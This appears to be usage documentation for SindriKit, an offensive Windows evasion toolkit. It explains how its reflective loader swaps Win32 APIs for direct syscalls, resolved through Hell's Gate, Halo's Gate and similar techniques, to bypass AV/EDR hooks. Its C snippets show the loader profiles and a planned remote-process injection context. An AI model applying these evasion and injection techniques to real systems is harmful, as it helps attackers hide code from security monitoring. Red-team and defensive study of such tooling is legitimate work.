# Basic Usage: The Core Engine

SindriKit is fundamentally an extensible evasion and execution toolkit. While it currently ships with a powerful reflective loader, the loader is merely the first domain implemented on top of the toolkit's core primitives. 

To use SindriKit effectively, the operator must understand how it separates offensive **Intent** (what is being accomplished) from the **Execution Mechanics** (how the OS actually executes it).

## 1. Core Philosophy: The Execution Abstraction Layer

SindriKit forces developers to explicitly define how operations interact with the host operating system. This is achieved via a toolkit-wide Dependency Injection (DI) pattern utilizing function pointer structures such as `snd_memory_api_t` (`mem_api`) and `snd_module_api_t` (`mod_api`).

Whether reflectively loading a PE, patching ETW, or injecting into a remote process, the high-level algorithm remains entirely agnostic to the execution mechanics. The engine never calls `VirtualAlloc` or `NtAllocateVirtualMemory` directly; it calls `ctx->mem_api->alloc`. 

This design means that swapping the entire operational footprint from highly visible, EDR-monitored Win32 APIs to stealthy, direct kernel syscalls is as simple as swapping a struct pointer during context initialization.

## 2. Global State vs. Explicit Execution Primitives

> [!IMPORTANT]
> Before initiating any high-level toolkit domain (like a loader or injector context), the underlying execution primitives must be explicitly bootstrapped. SindriKit does not rely on implicit global state fallbacks. The engine must be deliberately armed.

For example, when utilizing native execution primitives (`snd_mem_native` or `snd_mod_native`), the underlying NTDLL base must be resolved and the global syscall resolution pipeline must be configured:

```c
PVOID ntdll = NULL;

// 1. Explicitly locate and map NTDLL (e.g., via KnownDlls)
snd_status_t status = snd_map_knowndll(&snd_knowndlls_win, L"ntdll.dll", &ntdll);
if (status.code != SND_SUCCESS) {
    return status.os_error;
}

// 2. Feed the base address into the global execution primitive state
snd_set_ntdll(ntdll);

// 3. Configure the Cascading Syscall Pipeline
snd_set_syscall_strategy(snd_hell_extract_syscall);
snd_add_syscall_strategy(snd_halo_extract_syscall);
snd_add_syscall_strategy(snd_tartarus_extract_syscall);
snd_add_syscall_strategy(snd_veles_extract_syscall);
```

By enforcing this explicit bootstrapping phase, operators retain absolute control over how the toolkit derives system service numbers (SSNs) and communicates with the kernel before any offensive operation begins.

## 3. Case Studies: Standard vs. Stealth Profiles

The PoCs provided in `pocs/` demonstrate how these execution primitives are applied to the `snd_loader_ctx_t` domain to achieve vastly different OpSec profiles.

### Profile A: Standard / Diagnostic (`loader_winapi`)
This profile uses the standard, documented Win32 implementations (`snd_mem_win`, `snd_mod_win`). 

```c
snd_loader_ctx_t ctx = {0};
ctx.mem_api = &snd_mem_win; // Backed by VirtualAlloc/VirtualProtect
ctx.mod_api = &snd_mod_win; // Backed by GetModuleHandle/GetProcAddress

snd_status_t status = snd_prepare_reflective_image(&ctx);
if (status.code != SND_SUCCESS) {
    // Inspect status.code and status.os_error for failure reasons
    return status.os_error; 
}

status = snd_execute_reflective_image(&ctx);
if (status.code != SND_SUCCESS) {
    return status.os_error;
}
```
**OpSec Impact:** This profile provides maximum stability and straightforward debugging, but acts as an absolute flare to AV/EDR. Every memory operation directly triggers userland inline hooks inside `ntdll.dll`. It is intended strictly for diagnostic scenarios.

### Profile B: Stealth / Decoupled (`loader_nowinapi`)
This profile entirely drops the Win32 API layer in favor of direct, dynamic kernel interaction.

```c
snd_loader_ctx_t ctx = {0};
ctx.mem_api = &snd_mem_native; // Backed by Direct Syscalls
ctx.mod_api = &snd_mod_native; // Backed by Manual PEB Walking

// ... (Requires the global syscall bootstrapping shown in Section 2)

snd_status_t status = snd_prepare_reflective_image(&ctx);
if (status.code != SND_SUCCESS) {
    return status.os_error; 
}

status = snd_execute_reflective_image(&ctx);
if (status.code != SND_SUCCESS) {
    return status.os_error;
}
```
**OpSec Impact:** By injecting the `native` primitives, the loader utilizes the cascading syscall strategy to invoke `NtAllocateVirtualMemory` and `NtProtectVirtualMemory` directly. Crucially, the toolkit relies entirely on the `ntdll` base explicitly bootstrapped (e.g., via KnownDlls or custom mapping) rather than trusting the host's PEB state. This bypasses userland telemetry and API string artifacts, forming the baseline requirement for modern offensive operations.

## 4. Architectural Extensibility

Because the Dependency Injection and explicit primitive bootstrapping are generalized across the entire framework, SindriKit natively scales to future domains.

In the future, when initializing a `snd_injector_ctx_t` (for remote process injection) or a `snd_spoof_ctx_t` (for call stack spoofing), the operator follows the exact same paradigm:

```c
// Future Extensibility Example:
snd_injector_ctx_t inj_ctx = {0};
inj_ctx.mem_api = &snd_mem_native; 
inj_ctx.target_pid = 1337;

// Uses the previously configured Hell's Gate / Halo's Gate cascading pipeline
snd_execute_injection(&inj_ctx);
```

By decoupling "Intent" from "Execution Mechanics", SindriKit ensures that stealth primitives are configured only once. Every subsequent module, toolkit domain, and offensive capability inherently inherits the chosen OpSec profile.
